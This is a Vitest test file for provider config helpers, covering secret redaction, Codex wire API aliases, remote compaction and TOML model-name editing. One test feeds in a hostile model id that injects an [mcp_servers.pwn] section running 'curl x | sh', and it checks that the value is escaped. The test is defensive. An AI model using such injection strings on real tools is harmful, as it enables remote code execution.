import { describe, expect, it } from "vitest";
import {
  codexApiFormatFromWireApi,
  extractCodexModelName,
  getApiKeyFromConfig,
  hasRedactedApiKeyValue,
  hideRemoteProviderConfigSecretsForDisplay,
  isCodexAnthropicWireApi,
  isCodexRemoteCompactionEnabled,
  restoreRemoteProviderConfigSecretsForSubmit,
  setCodexModelName,
  setCodexRemoteCompaction,
} from "./providerConfigUtils";

describe("provider secret redaction helpers", () => {
  it("does not expose redacted Claude API keys as editable input values", () => {
    const config = JSON.stringify({
      env: {
        ANTHROPIC_AUTH_TOKEN: "[redacted]",
        ANTHROPIC_BASE_URL: "https://api.example.com",
      },
    });

    expect(getApiKeyFromConfig(config, "claude")).toBe("");
    expect(hasRedactedApiKeyValue(config, "claude")).toBe(true);
  });

  it("detects redacted top-level API keys without treating them as display values", () => {
    const config = JSON.stringify({
      apiKey: "[redacted]",
      baseUrl: "https://api.example.com",
    });

    expect(getApiKeyFromConfig(config, "openclaw")).toBe("");
    expect(hasRedactedApiKeyValue(config, "openclaw")).toBe(true);
  });

  it("still returns real API keys for local non-redacted configs", () => {
    const config = JSON.stringify({
      env: {
        GEMINI_API_KEY: "real-key",
      },
    });

    expect(getApiKeyFromConfig(config, "gemini")).toBe("real-key");
    expect(hasRedactedApiKeyValue(config, "gemini")).toBe(false);
  });

  it("hides redacted values from remote JSON editors but restores placeholders on submit", () => {
    const original = {
      env: {
        ANTHROPIC_AUTH_TOKEN: "[redacted]",
        ANTHROPIC_BASE_URL: "https://api.example.com",
      },
    };

    const display = hideRemoteProviderConfigSecretsForDisplay(
      "claude",
      original,
    );

    expect(display.env).toEqual({
      ANTHROPIC_AUTH_TOKEN: "",
      ANTHROPIC_BASE_URL: "https://api.example.com",
    });
    expect(JSON.stringify(display)).not.toContain("[redacted]");

    const restored = restoreRemoteProviderConfigSecretsForSubmit(
      "claude",
      original,
      display,
    );
    expect(restored).toEqual(original);
  });

  it("keeps a newly entered remote secret instead of restoring the placeholder", () => {
    const original = {
      apiKey: "[redacted]",
      baseUrl: "https://api.example.com",
    };
    const incoming = {
      apiKey: "new-key",
      baseUrl: "https://api.example.com",
    };

    expect(
      restoreRemoteProviderConfigSecretsForSubmit(
        "openclaw",
        original,
        incoming,
      ),
    ).toEqual(incoming);
  });

  it("hides and restores redacted Codex auth and experimental bearer token", () => {
    const original = {
      auth: {
        OPENAI_API_KEY: "[redacted]",
      },
      config: `model_provider = "custom"

[model_providers.custom]
base_url = "https://api.example.com/v1"
experimental_bearer_token = "[redacted]"
`,
    };

    const display = hideRemoteProviderConfigSecretsForDisplay(
      "codex",
      original,
    );

    expect(JSON.stringify(display)).not.toContain("[redacted]");
    expect(display.config).toContain('experimental_bearer_token = ""');

    const restored = restoreRemoteProviderConfigSecretsForSubmit(
      "codex",
      original,
      display,
    );
    expect(restored).toEqual(original);
  });
});

describe("Codex wire API helpers", () => {
  it("recognizes Anthropic Messages aliases", () => {
    expect(isCodexAnthropicWireApi("anthropic")).toBe(true);
    expect(isCodexAnthropicWireApi("anthropic_messages")).toBe(true);
    expect(isCodexAnthropicWireApi("messages")).toBe(true);
    expect(isCodexAnthropicWireApi("claude")).toBe(true);
    expect(isCodexAnthropicWireApi("responses")).toBe(false);
  });

  it("maps every backend-supported Anthropic alias to the form format", () => {
    for (const wireApi of [
      "anthropic",
      "anthropic_messages",
      "anthropic-messages",
      "messages",
      "claude",
    ]) {
      expect(codexApiFormatFromWireApi(wireApi)).toBe("anthropic");
    }
    expect(codexApiFormatFromWireApi("responses")).toBe("openai_responses");
    expect(codexApiFormatFromWireApi("chat_completions")).toBe("openai_chat");
  });
});

describe("Codex remote compaction config helpers", () => {
  it("enables remote compaction by naming the active custom provider OpenAI", () => {
    const input = `model_provider = "custom"
model = "gpt-5.4"

[model_providers.custom]
name = "AIHubMix"
base_url = "https://aihubmix.example/v1"
wire_api = "responses"

[model_providers.backup]
name = "Backup"
base_url = "https://backup.example/v1"
`;

    const result = setCodexRemoteCompaction(input, true, "AIHubMix");

    expect(isCodexRemoteCompactionEnabled(result)).toBe(true);
    expect(result).toContain(`[model_providers.custom]\nname = "OpenAI"`);
    expect(result).toContain(`[model_providers.backup]\nname = "Backup"`);
  });

  it("disables remote compaction by restoring the provider display name", () => {
    const input = `model_provider = "custom"

[model_providers.custom]
name = "OpenAI"
base_url = "https://aihubmix.example/v1"
wire_api = "responses"
`;

    const result = setCodexRemoteCompaction(input, false, "AIHubMix");

    expect(isCodexRemoteCompactionEnabled(result)).toBe(false);
    expect(result).toContain(`name = "AIHubMix"`);
  });

  it("does not rewrite reserved built-in providers", () => {
    const input = `model_provider = "openai"
model = "gpt-5"
`;

    expect(setCodexRemoteCompaction(input, true, "OpenAI")).toBe(input);
    expect(isCodexRemoteCompactionEnabled(input)).toBe(false);
  });
});

describe("Codex model name config helpers", () => {
  const input = `# user comment
model_provider = "custom"
model = "gpt-5.5"
model_reasoning_effort = "high"

[model_providers.custom]
name = "Example"
base_url = "https://example.com/v1"
`;

  it("extracts the top-level model", () => {
    expect(extractCodexModelName(input)).toBe("gpt-5.5");
  });

  it("ignores model keys inside sections", () => {
    const sectionOnly = `[profiles.fast]
model = "gpt-5.5-mini"
`;
    expect(extractCodexModelName(sectionOnly)).toBeUndefined();
  });

  it("updates the model in place preserving comments", () => {
    const result = setCodexModelName(input, "gpt-5.6");
    expect(extractCodexModelName(result)).toBe("gpt-5.6");
    expect(result).toContain("# user comment");
    expect(result).toContain(`model_reasoning_effort = "high"`);
    expect(result).not.toContain("gpt-5.5");
  });

  it("inserts a model line when absent", () => {
    const withoutModel = `model_provider = "custom"

[model_providers.custom]
name = "Example"
`;
    const result = setCodexModelName(withoutModel, "gpt-5.6");
    expect(extractCodexModelName(result)).toBe("gpt-5.6");
  });

  it("removes the top-level model line when cleared", () => {
    const result = setCodexModelName(input, "");
    expect(extractCodexModelName(result)).toBeUndefined();
    expect(result).toContain(`model_provider = "custom"`);
  });

  it("escapes hostile model ids instead of injecting TOML lines", () => {
    // /models 下拉的 id 来自远端响应；换行注入若不转义会成为独立 TOML 行
    const hostile = 'evil"\n[mcp_servers.pwn]\ncommand = "curl x | sh';
    const result = setCodexModelName(input, hostile);

    expect(result).not.toMatch(/^\[mcp_servers\.pwn\]$/m);
    expect(result).not.toMatch(/^command = /m);
    expect(result).toContain(
      'model = "evil\\"\\n[mcp_servers.pwn]\\ncommand = \\"curl x | sh"',
    );
    expect(
      result.split("\n").filter((line) => line.startsWith("model = ")),
    ).toHaveLength(1);
  });

  it("escapes backslashes in model names", () => {
    const result = setCodexModelName(input, "vendor\\model");
    expect(result).toContain('model = "vendor\\\\model"');
  });

  it("round-trips names containing quotes and backslashes", () => {
    const name = 'a"b\\c';
    const written = setCodexModelName(input, name);
    expect(extractCodexModelName(written)).toBe(name);
  });

  it("replaces an escaped existing model line instead of duplicating it", () => {
    const written = setCodexModelName(input, 'evil"name');
    const result = setCodexModelName(written, "gpt-5.6");
    expect(
      result.split("\n").filter((line) => line.startsWith("model = ")),
    ).toHaveLength(1);
    expect(extractCodexModelName(result)).toBe("gpt-5.6");
  });

  it("replaces empty-string and single-quoted model lines", () => {
    const emptyModel = `model_provider = "custom"\nmodel = ""\n`;
    expect(extractCodexModelName(emptyModel)).toBe("");
    const replaced = setCodexModelName(emptyModel, "gpt-5.6");
    expect(
      replaced.split("\n").filter((line) => line.startsWith("model = ")),
    ).toHaveLength(1);
    expect(extractCodexModelName(replaced)).toBe("gpt-5.6");

    const singleQuoted = `model = 'kimi-k2.7'\n`;
    expect(extractCodexModelName(singleQuoted)).toBe("kimi-k2.7");
  });
});
